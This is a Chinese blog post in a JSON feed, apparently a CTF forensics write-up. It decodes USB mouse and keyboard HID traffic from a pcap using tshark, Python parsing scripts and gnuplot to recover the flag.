            "content_html": "<p>最近做到之前经典的流量题有点多，usb 就是其中之一，这里记录一下</p>\n<p>首先 wireshark 打开附件</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/LhLcuWbkya0tO5xt.png!thumbnail\" alt=\"\" /></p>\n<p>滑动查看</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/Vare5xin8L956m56.png!thumbnail\" alt=\"\" /></p>\n<p>能发现数据包的 HID<br />\nData 中带有四字节的数据，猜测为鼠标流量，用 tshark 提取 HID Data 数据</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">tshark -r usb.pcapng -T fields -e usbhid.data &gt; usbdata.txt</span><br></pre></td></tr></table></figure></p>\n<p>由于是记录目前常用的两种 usb 协议流量，因此就直接进行说明<br />\n在导出的 usbdata.txt 中可以看到</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/2FMn0yQhFoItARSW.png!thumbnail\" alt=\"\" /></p>\n<p>除了 4 字节的鼠标流量之外，还有 16 字节的键盘流量，就借着这个附件说明两种流量解密方法</p>\n<h2 id=\"鼠标流量\"><a class=\"anchor\" href=\"#鼠标流量\">#</a> 鼠标流量</h2>\n<p>首先利用脚本进行删除空行，冒号分隔的操作</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/usr/bin/env python</span><br><span class=\"line\"># -*- coding: utf-8 -*-</span><br><span class=\"line\">info = &#x27;&#x27;&#x27;</span><br><span class=\"line\">kali下运行：</span><br><span class=\"line\">tshark -r usb.pcap -T fields -e usb.capdata &gt; usbdata.txt</span><br><span class=\"line\">提取流量包信息</span><br><span class=\"line\">然后通过该脚本可以过滤掉空格和其他内容，并且添加冒号</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">print(info)</span><br><span class=\"line\"></span><br><span class=\"line\">f_data = input(&quot;请输入带处理txt文件的路径：&quot;)</span><br><span class=\"line\">shujian = int(input(&quot;鼠标流量信息请输入8，键盘流量请输入16：&quot;))</span><br><span class=\"line\">f = open(f_data, &#x27;r&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 整理到out.txt</span><br><span class=\"line\">with open(&#x27;out.txt&#x27;, &#x27;w&#x27;) as f_out:</span><br><span class=\"line\">    for i in f.readlines():</span><br><span class=\"line\">        s = i.strip()</span><br><span class=\"line\">        # 鼠标流量长度为8 ，键盘流量长度为16</span><br><span class=\"line\">        if len(s) == shujian:</span><br><span class=\"line\">            # 鼠标流量长度为8 ，键盘流量长度为16</span><br><span class=\"line\">            nsl = [s[j:j + 2] for j in range(0, shujian, 2)]</span><br><span class=\"line\">            ns = &quot;:&quot;.join(nsl)</span><br><span class=\"line\">            f_out.write(ns)</span><br><span class=\"line\">            f_out.write(&#x27;\\n&#x27;)</span><br></pre></td></tr></table></figure></p>\n<p>输入路径和 8<br />\n 得到</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/LJCTFRII7jB3Gjtb.png!thumbnail\" alt=\"\" /></p>\n<p>接着提取坐标</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nums = []</span><br><span class=\"line\">keys = open(&#x27;out.txt&#x27;,&#x27;r&#x27;)</span><br><span class=\"line\">f = open(&#x27;xy.txt&#x27;,&#x27;w&#x27;)</span><br><span class=\"line\">posx = 0</span><br><span class=\"line\">posy = 0</span><br><span class=\"line\">for line in keys:</span><br><span class=\"line\">    if len(line) != 12 :</span><br><span class=\"line\">        continue</span><br><span class=\"line\">    x = int(line[3:5],16)</span><br><span class=\"line\">    y = int(line[6:8],16)</span><br><span class=\"line\">    if x &gt; 127 :</span><br><span class=\"line\">        x -= 256</span><br><span class=\"line\">    if y &gt; 127 :</span><br><span class=\"line\">        y -= 256</span><br><span class=\"line\">    posx += x</span><br><span class=\"line\">    posy += y</span><br><span class=\"line\">    btn_flag = int(line[0:2],16)  # 1 for left , 2 for right , 0 for nothing</span><br><span class=\"line\">    if btn_flag == 1 : # 1 代表左键</span><br><span class=\"line\">        f.write(str(posx))</span><br><span class=\"line\">        f.write(&#x27; &#x27;)</span><br><span class=\"line\">        f.write(str(posy))</span><br><span class=\"line\">        f.write(&#x27;\\n&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">f.close()</span><br></pre></td></tr></table></figure></p>\n<p>得到<br />\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/s7ruj39OHOpkHe8p.png!thumbnail\" alt=\"\" title=\"fig:\" /></p>\n<p>使用 gnuplot 进行画图</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">plot &quot;xy.txt&quot;</span><br></pre></td></tr></table></figure></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/71m441A1k7qSjpYe.png!thumbnail\" alt=\"\" /></p>\n<p>得到</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/9P5nlYJzTTNOtW3K.png!thumbnail\" alt=\"\" /></p>\n<p>当然这题的 flag 并不是鼠标流量</p>\n<h2 id=\"键盘流量\"><a class=\"anchor\" href=\"#键盘流量\">#</a> 键盘流量</h2>\n<p>同样使用前面 tshark 提取出的 usbdata.txt</p>\n<h3 id=\"一\"><a class=\"anchor\" href=\"#一\">#</a> 一</h3>\n<p>可以使用该脚本进行一把梭（该脚本会将不是 8 字节键盘流量的数据给剔除掉）</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import os</span><br><span class=\"line\">normalKeys = &#123;&quot;04&quot;:&quot;a&quot;, &quot;05&quot;:&quot;b&quot;, &quot;06&quot;:&quot;c&quot;, &quot;07&quot;:&quot;d&quot;, &quot;08&quot;:&quot;e&quot;, &quot;09&quot;:&quot;f&quot;, &quot;0a&quot;:&quot;g&quot;, &quot;0b&quot;:&quot;h&quot;, &quot;0c&quot;:&quot;i&quot;, &quot;0d&quot;:&quot;j&quot;, &quot;0e&quot;:&quot;k&quot;, &quot;0f&quot;:&quot;l&quot;, &quot;10&quot;:&quot;m&quot;, &quot;11&quot;:&quot;n&quot;, &quot;12&quot;:&quot;o&quot;, &quot;13&quot;:&quot;p&quot;, &quot;14&quot;:&quot;q&quot;, &quot;15&quot;:&quot;r&quot;, &quot;16&quot;:&quot;s&quot;, &quot;17&quot;:&quot;t&quot;, &quot;18&quot;:&quot;u&quot;, &quot;19&quot;:&quot;v&quot;, &quot;1a&quot;:&quot;w&quot;, &quot;1b&quot;:&quot;x&quot;, &quot;1c&quot;:&quot;y&quot;, &quot;1d&quot;:&quot;z&quot;,&quot;1e&quot;:&quot;1&quot;, &quot;1f&quot;:&quot;2&quot;, &quot;20&quot;:&quot;3&quot;, &quot;21&quot;:&quot;4&quot;, &quot;22&quot;:&quot;5&quot;, &quot;23&quot;:&quot;6&quot;,&quot;24&quot;:&quot;7&quot;,&quot;25&quot;:&quot;8&quot;,&quot;26&quot;:&quot;9&quot;,&quot;27&quot;:&quot;0&quot;,&quot;28&quot;:&quot;&lt;RET&gt;&quot;,&quot;29&quot;:&quot;&lt;ESC&gt;&quot;,&quot;2a&quot;:&quot;&lt;DEL&gt;&quot;, &quot;2b&quot;:&quot;\\t&quot;,&quot;2c&quot;:&quot;&lt;SPACE&gt;&quot;,&quot;2d&quot;:&quot;-&quot;,&quot;2e&quot;:&quot;=&quot;,&quot;2f&quot;:&quot;[&quot;,&quot;30&quot;:&quot;]&quot;,&quot;31&quot;:&quot;\\\\&quot;,&quot;32&quot;:&quot;&lt;NON&gt;&quot;,&quot;33&quot;:&quot;;&quot;,&quot;34&quot;:&quot;&#x27;&quot;,&quot;35&quot;:&quot;&lt;GA&gt;&quot;,&quot;36&quot;:&quot;,&quot;,&quot;37&quot;:&quot;.&quot;,&quot;38&quot;:&quot;/&quot;,&quot;39&quot;:&quot;&lt;CAP&gt;&quot;,&quot;3a&quot;:&quot;&lt;F1&gt;&quot;,&quot;3b&quot;:&quot;&lt;F2&gt;&quot;, &quot;3c&quot;:&quot;&lt;F3&gt;&quot;,&quot;3d&quot;:&quot;&lt;F4&gt;&quot;,&quot;3e&quot;:&quot;&lt;F5&gt;&quot;,&quot;3f&quot;:&quot;&lt;F6&gt;&quot;,&quot;40&quot;:&quot;&lt;F7&gt;&quot;,&quot;41&quot;:&quot;&lt;F8&gt;&quot;,&quot;42&quot;:&quot;&lt;F9&gt;&quot;,&quot;43&quot;:&quot;&lt;F10&gt;&quot;,&quot;44&quot;:&quot;&lt;F11&gt;&quot;,&quot;45&quot;:&quot;&lt;F12&gt;&quot;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">shiftKeys = &#123;&quot;04&quot;:&quot;A&quot;, &quot;05&quot;:&quot;B&quot;, &quot;06&quot;:&quot;C&quot;, &quot;07&quot;:&quot;D&quot;, &quot;08&quot;:&quot;E&quot;, &quot;09&quot;:&quot;F&quot;, &quot;0a&quot;:&quot;G&quot;, &quot;0b&quot;:&quot;H&quot;, &quot;0c&quot;:&quot;I&quot;, &quot;0d&quot;:&quot;J&quot;, &quot;0e&quot;:&quot;K&quot;, &quot;0f&quot;:&quot;L&quot;, &quot;10&quot;:&quot;M&quot;, &quot;11&quot;:&quot;N&quot;, &quot;12&quot;:&quot;O&quot;, &quot;13&quot;:&quot;P&quot;, &quot;14&quot;:&quot;Q&quot;, &quot;15&quot;:&quot;R&quot;, &quot;16&quot;:&quot;S&quot;, &quot;17&quot;:&quot;T&quot;, &quot;18&quot;:&quot;U&quot;, &quot;19&quot;:&quot;V&quot;, &quot;1a&quot;:&quot;W&quot;, &quot;1b&quot;:&quot;X&quot;, &quot;1c&quot;:&quot;Y&quot;, &quot;1d&quot;:&quot;Z&quot;,&quot;1e&quot;:&quot;!&quot;, &quot;1f&quot;:&quot;@&quot;, &quot;20&quot;:&quot;#&quot;, &quot;21&quot;:&quot;$&quot;, &quot;22&quot;:&quot;%&quot;, &quot;23&quot;:&quot;^&quot;,&quot;24&quot;:&quot;&amp;&quot;,&quot;25&quot;:&quot;*&quot;,&quot;26&quot;:&quot;(&quot;,&quot;27&quot;:&quot;)&quot;,&quot;28&quot;:&quot;&lt;RET&gt;&quot;,&quot;29&quot;:&quot;&lt;ESC&gt;&quot;,&quot;2a&quot;:&quot;&lt;DEL&gt;&quot;, &quot;2b&quot;:&quot;\\t&quot;,&quot;2c&quot;:&quot;&lt;SPACE&gt;&quot;,&quot;2d&quot;:&quot;_&quot;,&quot;2e&quot;:&quot;+&quot;,&quot;2f&quot;:&quot;&#123;&quot;,&quot;30&quot;:&quot;&#125;&quot;,&quot;31&quot;:&quot;|&quot;,&quot;32&quot;:&quot;&lt;NON&gt;&quot;,&quot;33&quot;:&quot;\\&quot;&quot;,&quot;34&quot;:&quot;:&quot;,&quot;35&quot;:&quot;&lt;GA&gt;&quot;,&quot;36&quot;:&quot;&lt;&quot;,&quot;37&quot;:&quot;&gt;&quot;,&quot;38&quot;:&quot;?&quot;,&quot;39&quot;:&quot;&lt;CAP&gt;&quot;,&quot;3a&quot;:&quot;&lt;F1&gt;&quot;,&quot;3b&quot;:&quot;&lt;F2&gt;&quot;, &quot;3c&quot;:&quot;&lt;F3&gt;&quot;,&quot;3d&quot;:&quot;&lt;F4&gt;&quot;,&quot;3e&quot;:&quot;&lt;F5&gt;&quot;,&quot;3f&quot;:&quot;&lt;F6&gt;&quot;,&quot;40&quot;:&quot;&lt;F7&gt;&quot;,&quot;41&quot;:&quot;&lt;F8&gt;&quot;,&quot;42&quot;:&quot;&lt;F9&gt;&quot;,&quot;43&quot;:&quot;&lt;F10&gt;&quot;,&quot;44&quot;:&quot;&lt;F11&gt;&quot;,&quot;45&quot;:&quot;&lt;F12&gt;&quot;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">nums = []</span><br><span class=\"line\">keys = open(&#x27;usbdata.txt&#x27;)</span><br><span class=\"line\">for line in keys:</span><br><span class=\"line\">    #print(line)</span><br><span class=\"line\">    if len(line)!=17: #首先过滤掉鼠标等其他设备的USB流量</span><br><span class=\"line\">         continue</span><br><span class=\"line\">    nums.append(line[0:2]+line[4:6]) #取一、三字节</span><br><span class=\"line\">    #print(nums)</span><br><span class=\"line\">keys.close()</span><br><span class=\"line\">output = &quot;&quot;</span><br><span class=\"line\">for n in nums:</span><br><span class=\"line\">    if n[2:4] == &quot;00&quot; :</span><br><span class=\"line\">        continue</span><br><span class=\"line\"></span><br><span class=\"line\">    if n[2:4] in normalKeys:</span><br><span class=\"line\">        if n[0:2]==&quot;02&quot;: #表示按下了shift</span><br><span class=\"line\">            output += shiftKeys [n[2:4]]</span><br><span class=\"line\">        else :</span><br><span class=\"line\">            output += normalKeys [n[2:4]]</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        output += &#x27;[unknown]&#x27;</span><br><span class=\"line\">print(&#x27;output :&#x27; + output)</span><br></pre></td></tr></table></figure></p>\n<p>得到 flag<br />\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/YSwXyswom6ICBpyL.png!thumbnail\" alt=\"\" title=\"fig:\" /></p>\n<h3 id=\"二\"><a class=\"anchor\" href=\"#二\">#</a> 二</h3>\n<p>当然也可以和鼠标流量一样用脚本先把多余的剔除并且删除空行并使用冒号分隔</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/usr/bin/env python</span><br><span class=\"line\"># -*- coding: utf-8 -*-</span><br><span class=\"line\">info = &#x27;&#x27;&#x27;</span><br><span class=\"line\">kali下运行：</span><br><span class=\"line\">tshark -r usb.pcap -T fields -e usb.capdata &gt; usbdata.txt</span><br><span class=\"line\">提取流量包信息</span><br><span class=\"line\">然后通过该脚本可以过滤掉空格和其他内容，并且添加冒号</span><br><span class=\"line\">&#x27;&#x27;&#x27;</span><br><span class=\"line\">print(info)</span><br><span class=\"line\"></span><br><span class=\"line\">f_data = input(&quot;请输入带处理txt文件的路径：&quot;)</span><br><span class=\"line\">shujian = int(input(&quot;鼠标流量信息请输入8，键盘流量请输入16：&quot;))</span><br><span class=\"line\">f = open(f_data, &#x27;r&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\"># 整理到out.txt</span><br><span class=\"line\">with open(&#x27;out.txt&#x27;, &#x27;w&#x27;) as f_out:</span><br><span class=\"line\">    for i in f.readlines():</span><br><span class=\"line\">        s = i.strip()</span><br><span class=\"line\">        # 鼠标流量长度为8 ，键盘流量长度为16</span><br><span class=\"line\">        if len(s) == shujian:</span><br><span class=\"line\">            # 鼠标流量长度为8 ，键盘流量长度为16</span><br><span class=\"line\">            nsl = [s[j:j + 2] for j in range(0, shujian, 2)]</span><br><span class=\"line\">            ns = &quot;:&quot;.join(nsl)</span><br><span class=\"line\">            f_out.write(ns)</span><br><span class=\"line\">            f_out.write(&#x27;\\n&#x27;)</span><br></pre></td></tr></table></figure></p>\n<p>同样输入路径，16<br />\n 得到</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/UExxnxQdQ98AhqGI.png!thumbnail\" alt=\"\" /></p>\n<p>接着利用脚本对照转换</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/usr/bin/env python</span><br><span class=\"line\"># -*- coding:utf-8 -*-</span><br><span class=\"line\"></span><br><span class=\"line\">normalKeys = &#123;&quot;04&quot;:&quot;a&quot;, &quot;05&quot;:&quot;b&quot;, &quot;06&quot;:&quot;c&quot;, &quot;07&quot;:&quot;d&quot;, &quot;08&quot;:&quot;e&quot;, &quot;09&quot;:&quot;f&quot;, &quot;0a&quot;:&quot;g&quot;, &quot;0b&quot;:&quot;h&quot;, &quot;0c&quot;:&quot;i&quot;, &quot;0d&quot;:&quot;j&quot;, &quot;0e&quot;:&quot;k&quot;, &quot;0f&quot;:&quot;l&quot;, &quot;10&quot;:&quot;m&quot;, &quot;11&quot;:&quot;n&quot;, &quot;12&quot;:&quot;o&quot;, &quot;13&quot;:&quot;p&quot;, &quot;14&quot;:&quot;q&quot;, &quot;15&quot;:&quot;r&quot;, &quot;16&quot;:&quot;s&quot;, &quot;17&quot;:&quot;t&quot;, &quot;18&quot;:&quot;u&quot;, &quot;19&quot;:&quot;v&quot;, &quot;1a&quot;:&quot;w&quot;, &quot;1b&quot;:&quot;x&quot;, &quot;1c&quot;:&quot;y&quot;, &quot;1d&quot;:&quot;z&quot;,&quot;1e&quot;:&quot;1&quot;, &quot;1f&quot;:&quot;2&quot;, &quot;20&quot;:&quot;3&quot;, &quot;21&quot;:&quot;4&quot;, &quot;22&quot;:&quot;5&quot;, &quot;23&quot;:&quot;6&quot;,&quot;24&quot;:&quot;7&quot;,&quot;25&quot;:&quot;8&quot;,&quot;26&quot;:&quot;9&quot;,&quot;27&quot;:&quot;0&quot;,&quot;28&quot;:&quot;&lt;RET&gt;&quot;,&quot;29&quot;:&quot;&lt;ESC&gt;&quot;,&quot;2a&quot;:&quot;&lt;DEL&gt;&quot;, &quot;2b&quot;:&quot;\\t&quot;,&quot;2c&quot;:&quot;&lt;SPACE&gt;&quot;,&quot;2d&quot;:&quot;-&quot;,&quot;2e&quot;:&quot;=&quot;,&quot;2f&quot;:&quot;[&quot;,&quot;30&quot;:&quot;]&quot;,&quot;31&quot;:&quot;\\\\&quot;,&quot;32&quot;:&quot;&lt;NON&gt;&quot;,&quot;33&quot;:&quot;;&quot;,&quot;34&quot;:&quot;&#x27;&quot;,&quot;35&quot;:&quot;&lt;GA&gt;&quot;,&quot;36&quot;:&quot;,&quot;,&quot;37&quot;:&quot;.&quot;,&quot;38&quot;:&quot;/&quot;,&quot;39&quot;:&quot;&lt;CAP&gt;&quot;,&quot;3a&quot;:&quot;&lt;F1&gt;&quot;,&quot;3b&quot;:&quot;&lt;F2&gt;&quot;, &quot;3c&quot;:&quot;&lt;F3&gt;&quot;,&quot;3d&quot;:&quot;&lt;F4&gt;&quot;,&quot;3e&quot;:&quot;&lt;F5&gt;&quot;,&quot;3f&quot;:&quot;&lt;F6&gt;&quot;,&quot;40&quot;:&quot;&lt;F7&gt;&quot;,&quot;41&quot;:&quot;&lt;F8&gt;&quot;,&quot;42&quot;:&quot;&lt;F9&gt;&quot;,&quot;43&quot;:&quot;&lt;F10&gt;&quot;,&quot;44&quot;:&quot;&lt;F11&gt;&quot;,&quot;45&quot;:&quot;&lt;F12&gt;&quot;&#125;</span><br><span class=\"line\">shiftKeys = &#123;&quot;04&quot;:&quot;A&quot;, &quot;05&quot;:&quot;B&quot;, &quot;06&quot;:&quot;C&quot;, &quot;07&quot;:&quot;D&quot;, &quot;08&quot;:&quot;E&quot;, &quot;09&quot;:&quot;F&quot;, &quot;0a&quot;:&quot;G&quot;, &quot;0b&quot;:&quot;H&quot;, &quot;0c&quot;:&quot;I&quot;, &quot;0d&quot;:&quot;J&quot;, &quot;0e&quot;:&quot;K&quot;, &quot;0f&quot;:&quot;L&quot;, &quot;10&quot;:&quot;M&quot;, &quot;11&quot;:&quot;N&quot;, &quot;12&quot;:&quot;O&quot;, &quot;13&quot;:&quot;P&quot;, &quot;14&quot;:&quot;Q&quot;, &quot;15&quot;:&quot;R&quot;, &quot;16&quot;:&quot;S&quot;, &quot;17&quot;:&quot;T&quot;, &quot;18&quot;:&quot;U&quot;, &quot;19&quot;:&quot;V&quot;, &quot;1a&quot;:&quot;W&quot;, &quot;1b&quot;:&quot;X&quot;, &quot;1c&quot;:&quot;Y&quot;, &quot;1d&quot;:&quot;Z&quot;,&quot;1e&quot;:&quot;!&quot;, &quot;1f&quot;:&quot;@&quot;, &quot;20&quot;:&quot;#&quot;, &quot;21&quot;:&quot;$&quot;, &quot;22&quot;:&quot;%&quot;, &quot;23&quot;:&quot;^&quot;,&quot;24&quot;:&quot;&amp;&quot;,&quot;25&quot;:&quot;*&quot;,&quot;26&quot;:&quot;(&quot;,&quot;27&quot;:&quot;)&quot;,&quot;28&quot;:&quot;&lt;RET&gt;&quot;,&quot;29&quot;:&quot;&lt;ESC&gt;&quot;,&quot;2a&quot;:&quot;&lt;DEL&gt;&quot;, &quot;2b&quot;:&quot;\\t&quot;,&quot;2c&quot;:&quot;&lt;SPACE&gt;&quot;,&quot;2d&quot;:&quot;_&quot;,&quot;2e&quot;:&quot;+&quot;,&quot;2f&quot;:&quot;&#123;&quot;,&quot;30&quot;:&quot;&#125;&quot;,&quot;31&quot;:&quot;|&quot;,&quot;32&quot;:&quot;&lt;NON&gt;&quot;,&quot;33&quot;:&quot;\\&quot;&quot;,&quot;34&quot;:&quot;:&quot;,&quot;35&quot;:&quot;&lt;GA&gt;&quot;,&quot;36&quot;:&quot;&lt;&quot;,&quot;37&quot;:&quot;&gt;&quot;,&quot;38&quot;:&quot;?&quot;,&quot;39&quot;:&quot;&lt;CAP&gt;&quot;,&quot;3a&quot;:&quot;&lt;F1&gt;&quot;,&quot;3b&quot;:&quot;&lt;F2&gt;&quot;, &quot;3c&quot;:&quot;&lt;F3&gt;&quot;,&quot;3d&quot;:&quot;&lt;F4&gt;&quot;,&quot;3e&quot;:&quot;&lt;F5&gt;&quot;,&quot;3f&quot;:&quot;&lt;F6&gt;&quot;,&quot;40&quot;:&quot;&lt;F7&gt;&quot;,&quot;41&quot;:&quot;&lt;F8&gt;&quot;,&quot;42&quot;:&quot;&lt;F9&gt;&quot;,&quot;43&quot;:&quot;&lt;F10&gt;&quot;,&quot;44&quot;:&quot;&lt;F11&gt;&quot;,&quot;45&quot;:&quot;&lt;F12&gt;&quot;&#125;</span><br><span class=\"line\">output = []</span><br><span class=\"line\">keys = open(&#x27;out1.txt&#x27;)</span><br><span class=\"line\">for line in keys:</span><br><span class=\"line\">    try:</span><br><span class=\"line\">        if line[0]!=&#x27;0&#x27; or (line[1]!=&#x27;0&#x27; and line[1]!=&#x27;2&#x27;) or line[3]!=&#x27;0&#x27; or line[4]!=&#x27;0&#x27; or line[9]!=&#x27;0&#x27; or line[10]!=&#x27;0&#x27; or line[12]!=&#x27;0&#x27; or line[13]!=&#x27;0&#x27; or line[15]!=&#x27;0&#x27; or line[16]!=&#x27;0&#x27; or line[18]!=&#x27;0&#x27; or line[19]!=&#x27;0&#x27; or line[21]!=&#x27;0&#x27; or line[22]!=&#x27;0&#x27; or line[6:8]==&quot;00&quot;:</span><br><span class=\"line\">             continue</span><br><span class=\"line\">        if line[6:8] in normalKeys.keys():</span><br><span class=\"line\">            output += [[normalKeys[line[6:8]]],[shiftKeys[line[6:8]]]][line[1]==&#x27;2&#x27;]</span><br><span class=\"line\">        else:</span><br><span class=\"line\">            output += [&#x27;[unknown]&#x27;]</span><br><span class=\"line\">    except:</span><br><span class=\"line\">        pass</span><br><span class=\"line\">keys.close()</span><br><span class=\"line\"></span><br><span class=\"line\">flag=0</span><br><span class=\"line\">print(&quot;&quot;.join(output))</span><br><span class=\"line\">for i in range(len(output)):</span><br><span class=\"line\">    try:</span><br><span class=\"line\">        a=output.index(&#x27;&lt;DEL&gt;&#x27;)</span><br><span class=\"line\">        del output[a]</span><br><span class=\"line\">        del output[a-1]</span><br><span class=\"line\">    except:</span><br><span class=\"line\">        pass</span><br><span class=\"line\">for i in range(len(output)):</span><br><span class=\"line\">    try:</span><br><span class=\"line\">        if output[i]==&quot;&lt;CAP&gt;&quot;:</span><br><span class=\"line\">            flag+=1</span><br><span class=\"line\">            output.pop(i)</span><br><span class=\"line\">            if flag==2:</span><br><span class=\"line\">                flag=0</span><br><span class=\"line\">        if flag!=0:</span><br><span class=\"line\">            output[i]=output[i].upper()</span><br><span class=\"line\">    except:</span><br><span class=\"line\">        pass</span><br><span class=\"line\">print (&#x27;output :&#x27; + &quot;&quot;.join(output))</span><br></pre></td></tr></table></figure></p>\n<p>得到 flag<br />\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/9fWB6zzlzqpbQMUS.png!thumbnail\" alt=\"\" title=\"fig:\" /></p>\n",
            "tags": [
                "流量",
                "流量"
            ]
        }
    ]
}